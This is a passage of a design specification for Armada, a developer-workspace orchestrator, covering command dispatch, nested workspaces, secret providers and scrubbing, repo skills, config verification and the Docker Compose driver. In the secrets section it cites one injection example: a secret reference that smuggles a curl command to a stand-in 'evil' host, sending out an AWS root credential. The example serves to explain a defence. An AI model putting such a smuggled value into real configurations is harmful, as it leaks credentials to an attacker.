that repo, and Armada must not swallow them or force them elsewhere. A top-level `commands:`
block, sibling of `components:`, declares them:

```yaml
commands:
  worktrees:
    cmd: uv run scripts/worktrees.py
    help: Create and tear down git worktrees
    env:
      WORKSPACE: ${workspace.id}
      REGISTRY: ${env.COMPANY_REGISTRY}     # bare read; unset is bad_config
    secrets: [GITHUB_TOKEN]                 # explicit grant, §4.7
    owns:
      containers: "label=com.example.worktree=${workspace.id}"
      files: [".worktrees/${workspace.id}"]
  tickets:
    cmd: uv run scripts/tickets.py
```

`env:` is additive — the parent environment is inherited wholesale and these are layered on
top, so a command needing `$HOME` already has it.

`stdio:` is `inherit` or `pipe`, and **its default is inferred: `pipe` when the entry grants
secrets, `inherit` otherwise.** Piping lets Armada scrub its output; inheriting preserves the
child's TTY, so colours, progress bars and interactive prompts work.

The default is only a default. Armada must not decide this by inference alone, because
inference is wrong in both directions: a `deploy.sh` that holds a token *and* prompts for
confirmation needs `inherit` despite its grant, and a command with no grant that fetches its
own token internally and logs it needs `pipe` despite having none. The repo knows; Armada
cannot.

**`--json` overrides `stdio:` and forces `pipe`.** With `inherit` the child writes to Armada's
own stdout, and Armada then writes the envelope to the same descriptor — so the one consumer the
envelope exists for receives interleaved child output and JSON. §6's rule that "`--json` means
stdout carries the envelope and nothing else" applies to dispatched commands too; `stdio:`
chooses between `inherit` and `pipe` only when Armada is not emitting a machine-readable payload.

**`stdio: inherit` alongside a `secrets:` grant is permitted, and disables scrubbing for that
entry.** Armada still writes nothing itself — the child writes straight to the terminal — but
§4.7's practical protection does not apply. Two deliberate keys in one block is a clear
enough signal of intent; making it an error would leave the interactive-command-with-a-token
case unserviceable, forcing that script to fetch its own secret and putting it *outside*
Armada's management rather than inside it.

> **Reserved, not built: `stdio: pty`.** A pseudo-terminal gives the child a TTY while Armada
> still sees the bytes, which recovers colour and progress-bar fidelity under scrubbing. It
> is cleanly POSIX, so it costs nothing that §7 has not already given up. Output-only is
> modest; interactive *input* — raw mode, `SIGWINCH` forwarding — is where it gets expensive,
> and no fixture needs it yet.

`owns:` behaves exactly as it does under `run:` (§6.1), with one difference: it is a
**selector, not a record.** Armada stores the declaration and `armada manifest clean` *evaluates* it
against docker and the filesystem. That works because every selector is stamped with
`${workspace.id}`, and it means no lifecycle hook and no `owned` row written — a command
runs ad hoc, so there is no "while it was up" window to record against. `ports:` is not
available here; the block is already claimed by `armada manifest init`.

`armada worktrees prune --dry-run` runs `uv run scripts/worktrees.py prune --dry-run` from the
workspace root. Armada is a dispatcher here and nothing more: remaining argv passes through
untouched, and **the command's exit code is returned verbatim** rather than being mapped into
Armada's own codes — Armada did not decide the outcome, so it does not get to classify it.

**That collides with Armada's own map, and the envelope resolves it.** Armada assigns meanings to
`1`–`6` and `70` (`ARCHITECTURE.md` §1.6), so a child exiting `3` is on its face
indistinguishable from Armada's own `bad_config`. Two things make it unambiguous:

- **Armada's own error codes can only occur when the child did not run.** If the child ran at
  all, dispatch succeeded — so any code after that point is the child's.
- The envelope says which happened: **`data.dispatched`** is true only if the child was
  executed, and **`data.child_exit`** records its code.

Remapping the child's codes into a reserved band was considered and rejected: scripts return
meaningful codes their own callers already depend on, and rewriting them to protect Armada's
namespace breaks the thing `commands:` exists to preserve.

The same four substitutions apply and no others (§4.4) — plus `${env.NAME}` inside `env:`,
which is where env composition lives. **`${files}` in a `commands:` entry is `bad_config`** —
the schema rejects it rather than expanding it to nothing, because a silently empty expansion is
the exact failure §4.1's empty-set rule exists to prevent. `${files}` is never populated for a `commands:`
entry, since there is no scope to compute.

**A name may not shadow a built-in verb.** The **schema** rejects a `commands:` entry named
`init`, `up`, `down`, `check`, `clean`, `status`, `config`, `agents-md` or `explain` — it is a
property of one key with nothing to cross-reference, so it belongs there rather than in
`config verify` (§5). Without the rule a repo can silently break the one guarantee the project
exists to provide — that the six verbs mean the same thing everywhere.

**`explain` was missing from that list**, which §3.4 introduces as a verb in this same
document; phase 1 added it. The rule's own rationale covers it exactly, so the omission was an
oversight rather than a decision.

**Why this is in the config rather than a plugin mechanism.** It is the same argument as
§6.1: the thing a repo actually needs is a name and a command, not a lifecycle contract. This
is also what lets the source repo keep `worktrees` / `tickets` / `design` while giving up
`check` and `servers` (phase 6), so it is on the critical path rather than a nicety.

### 4.6 `workspaces:` — nested workspaces in one repo

**The default stays "packages are components."** A monorepo is one workspace, one port block,
one `.armada/`, and per-package work is served by the scope lens that already exists —
`armada manifest check --component web`, `armada manifest check web:e2e`, `match:` globs scoping by changed files
(§3.2, §3.3). Reach for this section only when that is genuinely not enough.

The case it exists for: `apps/foo` and `apps/bar` are **separate products that happen to share
a repo**, and foo's services, ports and lifecycle must be independent of bar's. A root config
declares them:

```yaml
# repo root armada.yml
manifest:
  version: 1
  workspaces: [apps/foo, apps/bar]   # separate workspaces, excluded from this one
  components:
    shared-lib:
      root: libs/shared
      checks: { lint: { cmd: "ruff check ${files}" } }
```

Each declared path holds its own `armada.yml` and becomes an ordinary workspace: its own id,
its own port block, its own `.armada/`.

**A nested workspace inherits nothing.** Its `armada.yml` is complete on its own —
`secret_providers:`, `secrets:`, `commands:` and `components:` are *not* inherited from the
root, and a nested config that needs a provider declares it. "An ordinary workspace" is meant
literally: the only thing the root contributes is permission for it to exist. Inheritance was
left unstated in an earlier draft, which meant every reader had to guess, and the two obvious
guesses produce different configs. A root that is *nothing but* a manifest — `workspaces:`
with no `components:` — is legal, and is the honest shape for a repo of genuinely independent
products.

**No new runtime concepts.** Two workspaces sharing a checkout is structurally identical to
two git worktrees, which §2.2 already models as flat siblings. They share a `project_id`,
because they *are* the same repo — so `armada manifest status --project` reporting "foo is up, bar is
down" is the right answer, `armada manifest clean` still touches only your own workspace, and
`armada manifest clean --project` still touches both because that is the destructive option you have to
ask for.

**The thing that is actually illegal is overlap, not nesting.** If the root also claimed
`apps/foo` as a component root or reached into it with a `match:` glob, that subtree would
have two owners with two ids and two port blocks — the same source and services claimed
twice. So `config verify` asserts that no `components[].root` and no `match:` glob reaches
into a declared nested workspace.

**That rule is about naming the subtree, not about covering the root.** A declared workspace
is *excluded from this one* — it is not part of the parent's file set, so the parent's file
set is already the tree minus every declared workspace. A workspace-wide `match: ["**"]`
therefore means "everything in **this** workspace" and reaches into nothing; there is no
second owner and nothing for verify to reject. What verify rejects is a `root:` or a glob
that names a path *inside* a declared workspace — `root: apps/foo`, `match: ["apps/foo/**"]`
— because that is a claim on a subtree this workspace does not own. The distinction matters
because `match:` has a default (§4.1.1): a root-less component's default is `**`, and a rule
that read "no glob may cover a declared workspace" would fail configs whose author wrote no
glob at all.

**Why declared at the root rather than inferred.** Inferring — "any subtree containing a
`armada.yml` is automatically excluded" — needs no configuration, but it means dropping a file
into a directory silently changes the root's behaviour, and an *accidental* `armada.yml`
quietly becomes a workspace instead of an error. Declaring it keeps the stray-file case loud
(§2.1) while letting the deliberate case work.

> **Not built: config fragments.** A different need — one workspace whose config is split
> across per-package files for authoring reasons, rather than several workspaces. If that
> becomes real, the answer is an include mechanism that still resolves to a single workspace,
> **not** nested workspaces. Named here so nobody later reaches for the wrong one.

### 4.7 `secrets:` — tokens reach the process, never the transcript

Armada is the only thing in the stack that constructs the environment for every process in the
repo. That makes it the one place this can be fixed.

**The problem.** An agent runs `armada manifest up` and a service needs `STRIPE_SECRET_KEY`. Today that
means a `.env` file an agent will eventually read while debugging, or an `export` in a shell
history, or — worst — a token on the command line, visible in `ps` to every process on the
machine. And when a command echoes its environment on failure, Armada captures that into
`.armada/run/<id>/logs/`, which is a file agents are *expected* to read.

```yaml
secret_providers:
  op:       { cmd: "op read ${ref}" }
  aws-sm:   { cmd: "aws secretsmanager get-secret-value --secret-id ${ref}
                     --query SecretString --output text" }
  keychain: { cmd: "security find-generic-password -s ${ref} -w" }

secrets:
  GITHUB_TOKEN: op://Engineering/github/token
  DB_PASSWORD:  aws-sm://prod/db#password

components:
  api:
    run:
      driver: command
      cmd: manage.py runserver 0.0.0.0:${port.api}
      secrets: [DB_PASSWORD]        # granted here, and nowhere else
```

The URI scheme selects the provider; `${ref}` is the rest of the reference.

**Provider names are URI schemes, so they use the scheme grammar — `^[a-z0-9][a-z0-9+.-]*$`
— not the name grammar used for components and checks.** The difference is one character:
`_` is legal in a component name and illegal in a scheme, so `aws_sm:` would be a provider
that can never be referenced. Narrower grammar, caught at parse.

**Five properties, each load-bearing:**

| | |
|---|---|
| **Reference, never value** | `armada.yml` stays committed and diffable. It holds a pointer. |
| **Grants are explicit and per-entry** | A `run:`, `checks:` entry or `commands:` entry names what it needs. Least privilege, and `grep -n "secrets:"` answers "what can reach this token." |
| **Injected via env at spawn, never argv** | argv is world-readable through `ps`. |
| **Armada scrubs resolved values from everything it writes** | logs, `--json`, error messages, the live table. |
| **There is no retrieval verb** | No `armada secret get`, ever. An agent can *use* a secret by running `armada manifest up`; it cannot *obtain* one. That asymmetry is the entire point. |

**Armada reads raw and writes scrubbed.** Scrubbing is a filter applied on the way *out*, never
a transform on the stream. So `ready: { log: <regex> }`, any `parse:` keys and exit-code
interpretation all see the real bytes, while the log file, `--json` and **the terminal** see
redacted ones. Scrubbing first would break a ready-check whose regex spans a redacted value —
`listening on postgres://.*@localhost` — and buys nothing.

The terminal counts as a write: if an agent runs `armada manifest up` and Armada streams service output,
that lands in the transcript. Which is why `stdio:` (§4.5) matters — Armada can only scrub what
it can see.

**Providers are commands, not integrations.** Armada must never grow 1Password, AWS or Keychain
SDKs. A provider is a command that prints a secret to stdout — Armada runs it through the
injected `run`, captures stdout, and never logs it. That is roughly a hundred lines with no
vendor lock-in, and it is the same instinct as §6 ("no vendor-named drivers") and §6.1
("`owns:` instead of a plugin API"). Vault, Doppler, `pass` and a homegrown script all work
on day one without Armada knowing they exist.

**Never cache a resolved secret to disk.** That is the rule, and it is about *disk* — writing
one is a new leak surface.

**In memory, for the lifetime of one Armada process, it is cached.** A run granting the same
secret to twenty checks would otherwise invoke the provider twenty times, which for `op` can
mean twenty biometric prompts. One process, one resolution; the process exits and the cache
is gone with it.

**Secrets are resolved *before* the process detaches.** `armada manifest check --detach` has no terminal
once it is detached, so a provider that prompts cannot prompt. Resolving while the terminal is
still attached is the difference between `--detach` working with 1Password and not working at
all.

Providers still do their own session caching — `op` already does, and that remains correctly
their problem rather than Armada's.

**What this does and does not guarantee.** Armada guarantees the secret is never in `armada.yml`,
never in argv, never in Armada's own logs, `--json` or database, and never retrievable through
any Armada verb. Armada *cannot* stop an agent from running `op read` itself, cannot control a
command invoked outside Armada, and cannot defeat deliberate exfiltration through encoding.
Scrubbing is defense-in-depth, not a proof.

**And it cannot protect a secret from whatever it hands the secret to.** A grant to a
`driver: compose` service is **visible to anyone who can reach the Docker daemon** — measured:
`docker inspect --format '{{json .Config.Env}}'` returns it in cleartext. That is Docker's
trust model, not an Armada defect, and it is not fixable by Armada: even mounting the value as a
compose secret leaves it readable via `docker exec ... cat /run/secrets/<name>`. Daemon access
is root-equivalent to every container. Anyone running Armada already trusts Docker with the
workload; stating this plainly is worth more than machinery that moves the exposure without
closing it.

#### Five rules that are genuinely Armada's to enforce

1. **`${ref}` is passed as a single argv element, never through a shell.** A provider `cmd` is
   argv-split and the reference substituted into one slot. Otherwise
   `secrets: {X: "op://a; curl evil/$(op read op://Private/AWS/root)"}` is command injection
   that reads as an inert URI in review.
2. **Scrubbing happens at the value level, before serialization.** Filtering the serialized
   output fails the moment a value contains `"`, `\` or a non-ASCII byte, because the
   serializer escapes it first — Armada's own encoder defeating Armada's own filter.
3. **Provider failure output is never surfaced verbatim.** When a provider fails there is no
   resolved value registered to scrub against, so a chatty provider — `set -x`, `--debug` —
   leaks through a path structurally incapable of redaction. Report the provider name, its
   exit code, and a fixed message.
4. **`owns.release:` is recorded and reported, never executed** (§6.1). Armada therefore never
   resolves anything on that path, which is what keeps `manifest.db` free of secrets and secret
   references alike. `owns:` takes no `secrets:` grant.
5. **The detach handoff must not use Armada's own environment.** §4.7 resolves before detaching,
   and §4.5 inherits the parent environment wholesale to every child — so putting resolved
   values in Armada's own env would silently grant every secret to every child and void
   per-entry grants entirely. Pass them to the detached process over an inherited pipe closed
   after read. A test must assert that a check with **no** grant sees no secret in its
   environment during a run where a sibling check has one.

The win is narrower than "foolproof" and still large: **the default path becomes safe.** The
agent runs `armada manifest up`, the service gets its token, and nothing the agent can read ever
contained it. Today the default path is unsafe, and that is the actual bug.

**Schema lands in phase 1; implementation in phase 4**, when `up` exists and there is
something to inject into.

### 4.8 `skills:` — repo-local knowledge Armada holds a pointer to

A repository knows things about itself that no global skill can: how a migration is added
*here*, what a component looks like *in this design system*, which of four test commands is the
one that counts. `commands:` (§4.5) carries the invocation. It carries none of the judgement
around it, and the judgement is the part an agent in an unfamiliar repo gets wrong.

**A skill is two halves, and Armada may only own one of them.**

| Half | Lives in | Armada's relationship to it |
|---|---|---|
| **Mechanical** — which commands it may run, what verifies it, what it touches | `armada.yml` | Owns it. Ordinary config, cross-referenced and verified. |
| **Prose** — the reasoning, the conventions, the worked example | a markdown file in the repo | **Holds a path. Never parses a word of it.** |

That split is what keeps this inside `ARCHITECTURE.md` §1.9. The mechanical half is
indistinguishable in kind from `commands:` and `checks:` — a human, a script or CI can read it
and nothing about it is agent-shaped. The prose half Armada treats exactly as it already treats
`AGENTS.md` (§5.1): it writes to it and points at it, and never reads it back as instruction.

```yaml
skills:

  add-migration:
    summary: Add a Prisma migration and regenerate the client
    doc: docs/skills/add-migration.md
    uses: [migrate-new, migrate-apply]
    verify:
      check: [test, types]
    touches:
      - "prisma/migrations/**"
      - "prisma/schema.prisma"

  add-component:
    summary: Add a UI component following the design system in packages/ui
    doc: docs/skills/add-component.md
    uses: [gen-types]
    verify:
      check: [lint, test]
```

| Key | Required | Meaning |
|---|---|---|
| `summary` | yes | One line, for listings, routing and generated frontmatter. Same kind of value as `help:` on a `commands:` entry. |
| `doc` | yes | Workspace-relative path to the prose. Existence is verified; contents are never read by core. |
| `uses` | no | `commands:` keys this skill may invoke. **References, never new capability.** |
| `verify` | no | The check scope that proves the work landed — the same string `armada manifest check --scope` accepts. |
| `touches` | no | Advisory globs. Feeds the scope lens and lets a review step notice edits far outside them. |

**`uses:` grants nothing.** Every name in it must already be declared under `commands:`, so a
skill can never smuggle an invocation past `config verify`. This is the property that makes a
repo-authored skill safe to load: it can only name capability the repository already declared in
a file a human reviewed.

**`verify:` is what makes a skill produce a real verdict.** §14.3 says a verdict is only `PASS`
if it carries evidence an external command produced. Naming the check scope on the skill is what
makes that automatic instead of something a workflow author has to remember.

**There is deliberately no `cmd:`.** A skill with its own command is a `commands:` entry wearing
a hat, and if that were the design the honest move would be to delete `skills:` entirely. A
skill is *a named grant plus prose*; execution stays with the thing that already executes.

#### Armada cannot run a skill, and that is the point

There is no `armada skill <name> run`. "Add a migration" has no deterministic expansion; `pnpm
prisma migrate dev --create-only` does, and that already has a verb. A runner would mean Armada
choosing arguments on the user's behalf, which is precisely what §5's layer 1 refuses to do.

What Armada offers instead is three read paths over one resolved structure:

| Verb | Does |
|---|---|
| `armada manifest skills` | List declared skills with their grants and verify scope. |
| `armada manifest skills show <name>` | One skill, resolved — grants expanded to the real commands, plus the doc path. |
| `armada manifest render --harness <name>` | Write the pair out as skill files a harness loads. |

**`render` writes into a managed region** delimited exactly as §5.1's `AGENTS.md` block is, so a
hand-edit outside the markers survives a re-render, and `--verify` exits non-zero when the output
is stale — which makes it an ordinary entry in `checks:`.

`render` is the one verb here that looks like it might breach §1.9, and `ARCHITECTURE.md` §1.9
resolves it: **the rule governs inputs, not outputs.** Armada may emit a file an agent reads; it
may never accept a Job id, a model name or a transcript.

#### What `config verify` gains

Four checks, all pass 1 (§5), all cross-reference:

- every `doc:` path exists and resolves inside the workspace root
- every `uses:` entry names a declared `commands:` key
- every `verify.check` scope resolves to real check ids
- no skill name shadows a built-in verb — same rule and same reason as §4.5

That last set is the whole argument for a schema block rather than a loose directory of markdown:
a skill naming a command or a check that does not exist fails in seconds at authoring time,
instead of in a fresh worktree at the worst moment.

#### One thing this section does not decide

**Name collisions with guild skills belong to Fleet, not here** (§14, and
`ARCHITECTURE.md` §1.9 — Manifest may not name Guild). The policy is settled and recorded at
§14.5 so it is not relitigated: **the repo's skill wins, the shadow is always reported, and
`guild:<name>` reaches the shadowed one explicitly.**

---

## 5. Bootstrap: the three-layer sandwich

**Do not write a stack-detection engine.** Do not infer intent. The split:

| Layer | Who | Produces |
|-------|-----|----------|
| **1. Deterministic scan** | Armada (`armada manifest config scan`) | An **evidence report**, never a config |
| **2. Authoring** | the agent | The `armada.yml`, from evidence + schema + a worked example |
| **3. Deterministic verify** | Armada (`armada manifest config verify`) | Pass/fail with fix suggestions |

Layer 1 is safe precisely because it reports **facts, never intent**. "These 14 scripts
exist in package.json" cannot be wrong; "your test command is `pnpm test`" can. It emits:

- lockfiles and package managers found
- every `package.json` script, verbatim
- `pyproject` tool sections, `Makefile` targets
- compose services and their declared ports
- CI workflow steps — the best existing evidence of "what we actually run"
- workspace globs / monorepo layout

Layer 2 supplies what no scan can: which of four test scripts is canonical, which suite is
slow enough to deserve `cost: 4`, which two cannot share a browser, what genuinely needs
Postgres.

**Layer 3 runs in two passes, and only the first is cheap.**

```
pass 1  STATIC     schema, references, argv[0] resolvability, glob coverage
                   seconds; nothing is executed; failures short-circuit here

                   argv[0] resolvability applies to argv-split entries only.
                   Under `shell: true` there is no argv[0] to resolve — the
                   string is a program in a language Armada does not parse, and
                   `VAR=x exec "$TOOL"` has no first word that is a command.
                   verify reports those entries as `unchecked`, with a count,
                   rather than guessing or silently passing them. That count
                   is the honest cost of `shell: true` and is worth seeing.
pass 2  FOR REAL   run the check suite properly, exactly as `armada manifest check` would
```

**Pass 2 is a real run, not a simulation.** An earlier draft had verify "dry-invoke every `cmd`
and `fix` with `--help` / `--version` / `--dry-run`", which was the worst of both worlds:
Armada cannot know which of those three flags a given tool accepts, so against the fixture set it
would either **run the Playwright suite** (`pnpm e2e` ignores unknown flags), **create a
Kubernetes cluster** (`./scripts/kind-up.sh` likewise), or **fail a correct config** (`mix
dialyzer` errors on an unrecognised flag). Guessing a flag is not verification.

If you want to know a config works, run it. That is what pass 2 does, and it inherits `check`'s
semantics wholesale: a check declaring `needs:` starts its services (phase 4), and **verify
does not stop what it started** — same rule, same reason (§3, phase 3).

**Consequence, stated plainly:** `armada manifest config verify` is *not* a seconds-long check. Pass 1 is,
and catches the hallucinated script name that motivated layer 3 in the first place. Pass 2
takes as long as the repo's checks take — which for `python-ml` is thirty minutes. An authoring
loop that iterates on pass-1 failures stays fast; a full verify is a real build.

**Layer 3 is load-bearing.** Agents *will* hallucinate config — a plausible script name that
does not exist, a flag from a different version. `config verify` catches it in seconds
instead of on the first real run, in a fresh worktree, at the worst moment. It checks:

- schema validation
- **resolves every `cmd` and `fix`** — splits `argv[0]` and checks it is on `PATH` or is an executable file under the component root
- `needs:` refs resolve to a real component or a real check id, and the check-id graph is acyclic
- declared ports fit the block
- every `match:` glob hits at least one file
- no `commands:` entry shadows a built-in verb (§4.5)
- every `skills:` entry resolves: its `doc:` path exists inside the workspace root, every
  `uses:` name is a declared `commands:` key, every `verify.check` scope names real check ids,
  and no skill name shadows a built-in verb (§4.8)
- every `in:` names a component whose `run.driver` is `compose`
- no two components declare the same `ports:` name — `${port.NAME}` is workspace-global
- *(the schema already makes `shell: true` with `${files}` unrepresentable — see §4.1)*

> **Deliberately not checked: an `exclusive:` name used only once.** An earlier draft rejected
> that as a typo. Since §4.3 made exclusives **machine-wide**, a name used once in a repo still
> excludes every other workspace on the machine — which is the entire point of the change. The
> rule survived it unrevisited and would now reject §4.1's own example (`exclusive: [browser]`,
> used once) and the `python-ml` fixture's single GPU. A typo'd exclusive name is now harmless:
> it names a mutex nobody else contends for.
- no `components[].root` or `match:` glob reaches into a declared nested workspace (§4.6),
  and every path in `workspaces:` actually contains a `armada.yml`
- every granted secret name is declared in `secrets:`, and every reference's URI scheme
  matches a declared `secret_providers:` entry (§4.7). **Never resolves a secret** — the
  reference is checked, the value is not fetched
- no `components[].root` escapes the workspace root. **The schema rejects a leading `/` and a
  leading `..`; verify owns this rule because only verify can normalise `a/../../b`** — and an
  outside-root `root:` breaks the id derivation §2.2 depends on. Multi-repo is reserved (§7)
- `owns.files` paths that survive normalisation still land outside the workspace when the
  name is a symlink. verify resolves each one and rejects it if the target escapes; the schema
  cannot, and `clean` deletes what these name

> **Four rules that read like verify checks are enforced by the schema instead**, because they
> are properties of a single string or key with nothing to cross-reference: `shell: true`
> combined with `${files}`; `owns.files` being relative with no `..` and no leading `/`; a
> `commands:` entry shadowing a built-in verb; and `${env.NAME}` placement plus the `??` ban.
> The rule is worth stating in general form, because it decides where every future check
> goes: **if it needs a second part of the document, or the filesystem, it is verify; if it
> can be decided from the value in front of you, it is the schema.** A schema rejection is a
> parse error at every entry point, including the ones nobody remembered to route through
> verify.

### 5.1 `armada manifest agents-md`

Writes a managed block into `AGENTS.md`, generated from the *resolved* config so it lists
real component and check names.

- `--write` rewrites only between `<!-- armada:begin -->` / `<!-- armada:end -->`; anything
  outside is untouched. No markers → appends once, at the end.
- **`<!-- char:begin -->` / `<!-- char:end -->` are recognised too, and rewritten to the
  current spelling in place.** M1 renamed the markers ([`PHASES.md`](PHASES.md) §8.3) and a
  repository whose `AGENTS.md` already carries the old pair must not get a *second* block
  appended beneath the first — which is exactly what "no markers → append" does if the old
  pair is not looked for. Nothing has ever written a block, because this verb is not built, so
  this rule is here for whoever builds it rather than for a migration already needed.
- `--verify` exits non-zero if the block is stale, so it can be an ordinary check in
  `armada.yml`.
- Bare invocation prints to stdout, for repos that do not want a managed block.

---

## 6. Service drivers

**Two drivers only. No vendor-named drivers — no `tilt`, no `bazel`, no `make`.**

| Driver | Behavior |
|--------|----------|
| `compose` | **Resolve → transform → emit.** See §6.0 — this is not a matter of adding flags to `docker compose`. |
| `command` | Spawns detached in its own process group, records the pid, waits on the ready-check, kills the whole group on `down` — **SIGTERM, 10s grace, then SIGKILL**. Covers a supervisor, `pnpm dev`, `manage.py runserver`, a Procfile line — anything. |

**The escalation is unconditional, not a retry.** A group leader that ignores SIGTERM
immunises its whole group, since children inherit an ignored disposition across `fork` and
`exec` (`traps.md`), and a second SIGTERM achieves exactly as much as the first. `down`
reports `DOWN` only after the group is confirmed gone.

**One case escalation does not fix:** a service that calls `setsid` itself — ordinary
daemonizing — leaves the tracked group, so its recorded pgid is not the one it runs under and
no `killpg` reaches it. That is detected after the fact, by the port still being bound once
`down` claims success, and reported. Phase 2's done-when ("no process outlives its workspace")
must be tested against a SIGTERM-ignoring service and a self-`setsid` one; a cooperative
`sleep` passes while proving nothing.

**Control-plane docker calls carry a 30s timeout; work calls carry the deadline of the thing
they are doing.** The distinction is not cosmetic: measured, a stock `docker compose up -d`
with `depends_on: {condition: service_healthy}` took **43 seconds**, and a `docker compose exec`
running a check took **45**. A blanket 30s kills both and reports `environment`, exit 6 — "fix
the machine" when nothing is wrong with it — while `check_timeout` sits at 900.

| Call | Deadline |
|---|---|
| `ps`, `network ls`, `volume ls`, `inspect`, `version` | `docker_timeout`, default **30s** |
| `compose exec` for an `in:` check | that check's `timeout:` |
| `compose up`, `build`, `pull` | `up_timeout`, default **600s** |
| `compose down`, `rm` | `up_timeout` |

Only the first row is `environment` on expiry — those are questions, and a question that
cannot be answered in 30 seconds means the daemon is wedged. The rest are `timeout`, class
`timeout`, because a slow build is a slow build.

**The reason a timeout exists at all is the first row.** The CLI has no client-side timeout of its own (`traps.md`), and the call that matters is the
`docker ps` in `init`'s reap pass: without a deadline a hung daemon wedges *every new workspace
on the machine*, including the verb whose job is recovery.

**Armada probes the daemon with `docker version` before doing compose work**, because
`docker compose config` returns 0 against a dead daemon (`traps.md`) — so §6.0's steps 1
through 3 all succeed and Armada discovers the daemon is gone only at step 4.

### 6.0 The compose driver

An earlier draft specified this as *"shells out to `docker compose` with a project name
derived from the workspace id, port mappings rewritten into the claimed block,
`--label armada.workspace=<id>`."* **Two thirds of that is impossible.** `docker compose` has no
`--label` flag, and port mappings cannot be rewritten from the command line at all. Only the
project name was achievable. See [`traps.md`](traps.md) for what was measured.

The mechanism is four steps:

```
1. RESOLVE   docker compose -f <base…> -p armada-<id> \
                 --project-directory <workspace-root> config
             → one canonical document, with interpolation, extends:, anchors
               and relative paths already resolved

2. TRANSFORM ports[].published      → the claimed block
             labels.armada.workspace      → <id>       (every service)
             labels.armada.workspace_path → <realpath>
             labels.armada.namespace      → <ns>       (§2.3.1)
             build.labels.<all three>                (services that build)
             networks.<n>.labels.<all three>         TOP-LEVEL, not inherited
             volumes.<n>.labels.<all three>          TOP-LEVEL, not inherited

3. HOLD      in memory - never written to disk (see below)

4. RUN       <document on stdin> | docker compose -f - -p armada-<id> \
                 --project-directory <workspace-root> up -d
```

**The resolved document is never written to disk.** It exists in Armada's memory and on the
compose process's stdin, and nowhere else.

**Why generate a whole file rather than an override.** Because an override cannot do the one
thing it would be for: compose **appends** to `ports:` rather than replacing, so the base
port stays published and every workspace still binds it — the exact collision this project
exists to prevent. The `!override` tag fixes that on Compose ≥ 2.24.4 and is **silently ignored below
it** — you get the appended base port, and a collision, with no error. Depending on a merge
feature that fails silently in the older direction is not something to build a design on when
a repo's developers are, normally, on different Compose versions.

**Why Armada never parses compose semantics.** Step 1 hands that entire problem to compose
itself. Armada rewrites two keys in a document compose has already normalised, which is why
this works on any version and why `extends:`, YAML anchors and `${VAR}` interpolation are not
Armada's problem.

**Why it is not persisted, which an earlier draft got wrong.** That draft wrote the document
to `.armada/compose.yml` and called it "inspectable and diffable." Measured: `docker compose
config` **resolves `env_file:` and `${VAR}` interpolation and emits the values inline** —

```yaml
# from a repo's own .env, with no Armada involvement at all
environment: { INLINE: sentinel-from-envfile, SECRET_TOKEN: sentinel-from-envfile }
```

— so persisting it manufactures exactly the artifact §4.7 exists to eliminate: *"a `.env` file
an agent will eventually read while debugging."* It does so **for every repo**, including repos
that never adopt Armada's secrets mechanism. Those values never passed through Armada, so the
scrubber has never seen them and **structurally cannot redact them**. `ARCHITECTURE.md` §1.8's invariant — a
resolved secret is never written to `.armada/` — would be violated by construction.

Piping to `-f -` is verified to accept the document and produce identical resolved output.

**There is deliberately no `--dump-compose` flag either.** A draft added one, redacting every
`environment:` and `env_file:` value — but what survives redaction is a port map and two
labels, and both are already reported: ports in `data.results[].ports` (§3.1), labels by
`docker inspect`. It bought a fourth call site for the scrubber and a file path an error
message would helpfully suggest to a stuck agent, in exchange for information available two
other ways.

When `up` goes wrong, the port transform is visible in `data.results[].ports`, what the
container actually received is visible in `docker inspect`, and what Armada *would* do is visible
in `armada manifest up --dry-run` (§3.3.1).

**Ownership falls out.** Containers and networks carry `com.docker.compose.project=armada-<id>`
(compose applies it automatically from `-p`) plus the two Armada labels from the transform —
`armada.workspace` and `armada.workspace_path` (§2.3). `clean` uses the Armada labels, so it stays
driver-agnostic, and reaping stats the path rather than trusting the database (§2.3.1).

**Images, narrowed.** Armada labels only images it causes to be *built*, via `build.labels`. A
pulled image such as `postgres:16` is shared with the rest of the machine and was never
Armada's to remove. This corrects an earlier claim in §2.3 that stamping meant "passing the
label through to compose" — it does not — and it matches the evidence, which is ~2.1 GB per
production app **build**.

**Ready-check kinds — five, and this is the enumeration.** Each carries its own timeout, and
each applies to both drivers.

| Kind | Ready when |
|---|---|
| `http` | a GET returns 2xx |
| `tcp` | the port accepts a connection |
| `log` | a regex matches the service's stdout |
| `exec` | a command exits 0 |
| `none` | immediately on spawn — the service is fire-and-forget |

An earlier rewrite of this section dropped the list while [`PHASES.md`](PHASES.md) went on
promising "five ready-check kinds" that were then enumerated nowhere. Naming five kinds is not
a spec, so here is the encoding:

<!-- doclint: skip — five alternatives for one key, not one mapping -->
```yaml
ready: { http: "http://127.0.0.1:${port.api}/healthz", timeout: 60 }
ready: { tcp: pg }              # a declared port NAME, not a number
ready: { log: "listening on" }  # an unanchored regex over the service's stdout
ready: { exec: "pg_isready -q" }
ready: { none: true }
```

**Exactly one kind key, plus an optional `timeout:` in seconds — default 60.** A mapping with
two kind keys is `bad_config` rather than a precedence rule nobody would remember. `tcp:`
takes a port *name* because a number would be the pre-claim port, which is never the one the
service is on. `ready:` omitted defaults to `{ none: true }`, and `armada manifest up` then reports `UP`
on spawn — which is why the fixtures that have a real health endpoint declare one.

**`file:` accepts a list.** Repos commonly already run base-plus-override, and step 1 must
receive the same file set they do. Armada also ignores ambient `COMPOSE_FILE` and
`COMPOSE_PROJECT_NAME`, passing `-f` and `-p` explicitly every time, so the result does not
depend on the caller's environment.

> **Measured Docker behaviour lives in [`traps.md`](traps.md), which owns it.** An earlier
> draft reproduced all six measurements here, which meant two copies of a fact whose whole
> value is being trustworthy — and `traps.md`'s own rule is *re-run rather than re-trust*.
> Read the Docker Compose section there before designing anything that depends on how
> compose behaves.

#### The three `owns:` key sets

`owns:` appears in three places and they are **not** the same set. Enumerated, because "like
any other entry" was doing work no reader could check:

| Key | under `run:` | at component level | under `commands:` |
|---|:--:|:--:|:--:|
| `containers` `networks` `images` | yes | — | yes |
| `ports` | yes | — | **no** (§4.5) |
| `files` | yes | yes | yes |
| `release` | yes | yes | yes |

Component-level `owns:` records what `setup:` created and therefore has no runtime handles;
`commands:` cannot own ports because it never claims a block. `release:` is recorded and
reported, never executed, everywhere it appears — so it takes no `secrets:` grant anywhere
(§4.7 rule 4).

### 6.1 `owns:` — the extension point instead of a plugin API

Do **not** build a driver plugin system. It means a public lifecycle contract, error
semantics, and a versioning story — permanent API surface for a third driver that may never
arrive. `driver: command` already *is* the plugin system.

The one thing a first-class driver gives you that a bare command cannot is knowing what it
created, so `clean` can reclaim it. So let a `command` component declare that directly:

```yaml
components:
